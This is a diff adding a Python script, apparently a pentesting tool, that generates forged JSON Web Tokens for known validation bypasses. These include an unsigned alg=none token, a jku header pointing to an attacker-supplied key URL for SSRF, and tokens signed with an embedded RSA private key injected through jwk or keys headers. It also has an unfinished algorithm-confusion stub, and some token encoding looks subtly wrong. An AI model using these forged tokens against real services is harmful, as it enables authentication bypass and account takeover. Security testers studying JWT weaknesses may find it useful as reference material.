@@ -1,0 +1,122 @@
+#!/usr/bin/env python
+import json, argparse, jwt, sys, base64, copy, requests
+
+
+
+parser = argparse.ArgumentParser(description='Jwt payload generator')
+group = parser.add_mutually_exclusive_group()
+
+group.add_argument("--jwt", type=str, help="Json Web Token")
+group.add_argument("--json", type=str, nargs=2, help="{header}, {body}")
+
+parser.add_argument("--jku", type=str, help="Keys url to SSRF")
+parser.add_argument("--pubkeyurl", type=str, help="Public Keys Url to Algorithm confusion")
+
+args = parser.parse_args()
+
+
+
+if args.jwt:
+    header = args.jwt.split(".")[0]
+    header = base64.b64decode(header.encode() + b'==').decode()
+    
+    body = args.jwt.split(".")[1]
+    body = base64.b64decode(body.encode() + b'==').decode()
+
+if args.json:
+    header = args.json[0]
+    body = args.json[1]
+
+header = json.loads(header)
+body = json.loads(body)
+
+
+
+
+
+default_rsa_keys = {
+    "public":{
+        "kty": "RSA",
+        "n": "rbW8FRkcgQMkcGrXaCnrJa8L3m8u56eJEz1uaXI85-9m5dIRlxqzK8WftGD7_tkr-ld8JIn8ty1DgpzS6Zg5y5Guvv9IZoueZdi72FANZTjiGfI9nhnWkKKpKI3u0JfvpCuJVuD8dikp5JimzAfIsF5gqm8npVX_ofuJCtA4TJi5g6BMvNusczdighRGwXCVZaXzwo0e5kqoI-sN0V3yjy5f58J66p5j5GuAWso7Po7aAL6SgZ5PZ43URydSBQYKT-8EOvp2X40oZpBdGIje-G_l4h6BbqYLadnd5YrrBUVi-CnimpEr8FN8CYbivqsJpaIAe7ZFDnBhw94ilcFwyQ",
+        "e": "AQAB",
+        "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG"
+    },
+    "private":"LS0tLS1CRUdJTiBQUklWQVRFIEtFWS0tLS0tCk1JSUV2Z0lCQURBTkJna3Foa2lHOXcwQkFRRUZBQVNDQktnd2dnU2tBZ0VBQW9JQkFRQ3R0YndWR1J5QkF5UncKYXRkb0tlc2xyd3ZlYnk3bnA0a1RQVzVwY2p6bjcyYmwwaEdYR3JNcnhaKzBZUHYrMlN2NlYzd2tpZnkzTFVPQwpuTkxwbURuTGthNisvMGhtaTU1bDJMdllVQTFsT09JWjhqMmVHZGFRb3Frb2plN1FsKytrSzRsVzRQeDJLU25rCm1LYk1COGl3WG1DcWJ5ZWxWZitoKzRrSzBEaE1tTG1Eb0V5ODI2eHpOMktDRkViQmNKVmxwZlBDalI3bVNxZ2oKNnczUlhmS1BMbC9ud25ycW5tUGthNEJheWpzK2p0b0F2cEtCbms5bmpkUkhKMUlGQmdwUDd3UTYrblpmalNobQprRjBZaU43NGIrWGlIb0Z1cGd0cDJkM2xpdXNGUldMNEtlS2FrU3Z3VTN3Smh1Sytxd21sb2dCN3RrVU9jR0hECjNpS1Z3WERKQWdNQkFBRUNnZ0VBRmpJZ2hEbWZNTVRzQlFsQjJPZHlTbkJoZmR5TEM4S1dlMFRnTk0wS0IwREoKenhmV2M0NVAwb24vN0Jad1hKSDNVcGVYSHp3YWRIVnVLT1JNOXRnaW1tWlZBOGF1dzV1WGM4QUwwSW42RERNRwpnUFk0OVZpcjEvTlExZ084dmg2TDJsaE54aklkVUNQV1hJVTgydGtyeFkxcG9KMXZYV3J0clE3czVkclJOc2dmCkF5MDBuMHhwNXA0UkU2am40eG94aEdRTDVMRktKMFdoLy9oZVgyR1lGdk81Mk1jTGtXUVlQblJOaDNEM05NVW4KSytkZG1Ca1NkVzdKdUR3a0hwMVlhcXR0RjJnNWlFZlVuWUhHT0I4OHd1L3RsaFJ4VGltbGhER0hJMTJkVFlNTgpYTlBpSURKa2RSV3NVNEx4UDJHajRGTnV1and5RUVTV3d5L3ZEUDRqMlFLQmdRRGUxVUZwN0thZW5acXU5VlNiCndWYkh4QjlBN0lFSlVKUjVrRGVPbEVTOVExeEUyMFZiK25zRE94c3lDdVhhN1BCL1dnc1lPYUNydjVPTk44RDIKWU9CZjl2SFp4d1VwcWJXdnFmUC9rQW1SRC9WdFVweE1ZV0drYmFUTmlHTW56MXZRd1RQc0UxVDF0cHNSblg3RwpwYjVsVGVOMmllTks2WGZ3VDdpNU82eGtVd0tCZ1FESGtMWFY1YUxqamRVMG9NMitrTUpwdFNwOUFrY1BaSEFpCnlld3FNc1E4ek1Zb20xbDI5L21CdU9OYUhzZTkvdkd4SWwvS1JWZGcwQndOdlRyUWRiSWpLYnN6aVorTTVNRzkKTEt2bldYNzR1NFNxWkFrNkRBUG9YYUtXeVhtc0FPUkpSc0lsbXRpSDdUcHJ1eHd6djlCYktFSWxBb3g0d1NyYQpnSG0zODZJeTh3S0JnRk50c3AwTy9sOGFrT1I2YytBUTVnWExGd3grdjkwVjcxRUlQdFRDREc1ei91TEUyZFlUCkZPVmp4czNZcUxCcno2dE9zaUt5eU1ZazV3Q1RaRXFhZ01kTk5NV2Ryd0FuU3gvbTJMVFJYOU9SRHdtTVNYcUwKWnp4aDFMY2pIa1MwYlNMZWd5c2JIYzhWUEQrL0lNME5GeGprcllvZkhCdGJDQTNRTzFBVzJIZURBb0dCQUxTUwp1RFhIQjFDbmNaZWhPUW1KcXFCRGtTSjBBU0JvWFI3ZFhwZ0FQNWhVSWFsMGg4c2lMZDIzRWVEbG9RN0Z0S1AyCjJuNEhxRHl0a2ZUTW1IOHZQL1NaT2c0MEpPNHp2eW9SVmFxTVRGdDhNVnFNRWQwNEtnRURXSzdmdHZ4d0FpQmIKcWlpa3AvQzJNdnB2MytEald3Qmd1UmtMNlZjS1VtQkxoOWR1MkFFSkFvR0JBSldCY0VxR2pURFFqWEZNZU0zNwovUE85c0pMVWhLWitpUnFoREtRdXB1L2RCUmRRRlJaOUlyQ0ViTFMzanh3bStsM1ByeDEzNTNIS01WN21uUDIrClBUTGpub241Y3lnVms5VGFyazNXa0NmaXRKWVZOdVlnY2NkY3VtNWlJbWhlRkFZY1RMZTc3OTZjdExyd3RwZGQKb21pVkE1MVRzNnZ6RFIzQWxDRk5yZmtHCi0tLS0tRU5EIFBSSVZBVEUgS0VZLS0tLS0K"
+}
+
+
+
+
+
+
+
+
+all_jwt = []
+
+
+
+#Algorithm = none
+new_header = copy.deepcopy(header)
+new_header["alg"] = "none"
+new_header.pop("kid", None)
+new_header.pop("jwk", None)
+new_header.pop("jku", None)
+
+jwt_none = base64.b64encode(json.dumps(new_header).encode()) + b"." + base64.b64encode(json.dumps(body).encode())
+all_jwt.append(jwt_none.decode())
+
+
+
+#SSRF with JKU
+if args.jku:
+    url = args.jku
+    
+    new_header = copy.deepcopy(header)
+    new_header.pop("jwk", None)
+    new_header["jku"] = url
+    
+
+    new_header = base64.b64encode(json.dumps(new_header).encode()).decode().rstrip("=")
+    new_body = base64.b64encode(json.dumps(body).encode()).decode().rstrip("=")
+    
+    jwt_jku = new_header + "." + new_body
+    
+    all_jwt.append(jwt_jku)
+
+
+
+#Inject JWK in header
+new_header = copy.deepcopy(header)
+new_header.pop("jku", None)
+
+new_header["kid"] = default_rsa_keys["public"]["kid"]
+new_header["jwk"] = default_rsa_keys["public"]
+
+jwt_jwk = jwt.encode(headers=new_header, payload=body, algorithm=new_header["alg"], key=base64.b64decode(default_rsa_keys["private"]))
+all_jwt.append(jwt_jwk)
+
+
+
+#Inject keys in header
+new_header = copy.deepcopy(header)
+new_header.pop("jwk", None)
+new_header.pop("jku", None)
+
+new_header["kid"] = default_rsa_keys["public"]["kid"]
+new_header["keys"] = [default_rsa_keys["public"]]
+
+jwt_jwk = jwt.encode(headers=new_header, payload=body, algorithm=new_header["alg"], key=base64.b64decode(default_rsa_keys["private"]))
+all_jwt.append(jwt_jwk)
+
+
+#Algorithm confusion
+if args.pubkeyurl:
+    pubkeys = requests.get(args.pubkeyurl).json()
+    
+    
+    
+    
+
+print(all_jwt)
+
+
